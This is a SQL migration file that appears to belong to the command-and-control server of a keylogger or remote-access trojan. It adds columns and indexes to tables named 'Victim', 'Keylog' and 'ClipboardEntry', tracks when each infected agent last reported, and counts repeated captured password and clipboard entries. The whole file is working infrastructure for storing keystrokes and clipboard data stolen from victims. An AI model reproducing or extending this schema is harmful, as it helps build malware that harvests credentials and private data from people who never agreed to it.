-- Presence must come from an agent signal, never from a bridge send.
ALTER TABLE "Victim" ADD COLUMN "lastAgentMessageAt" TIMESTAMP(3) NOT NULL DEFAULT CURRENT_TIMESTAMP;

-- Chained password?/clipboard: rows carry a repeat counter.
ALTER TABLE "Keylog" ADD COLUMN "updatedAt" TIMESTAMP(3) NOT NULL DEFAULT CURRENT_TIMESTAMP;
ALTER TABLE "Keylog" ADD COLUMN "count" INTEGER NOT NULL DEFAULT 1;
ALTER TABLE "ClipboardEntry" ADD COLUMN "updatedAt" TIMESTAMP(3) NOT NULL DEFAULT CURRENT_TIMESTAMP;
ALTER TABLE "ClipboardEntry" ADD COLUMN "count" INTEGER NOT NULL DEFAULT 1;

CREATE INDEX "Keylog_victimId_process_title_idx" ON "Keylog"("victimId", "process", "title");
CREATE INDEX "ClipboardEntry_victimId_kind_idx" ON "ClipboardEntry"("victimId", "kind");
CREATE INDEX "Victim_lastAgentMessageAt_idx" ON "Victim"("lastAgentMessageAt");
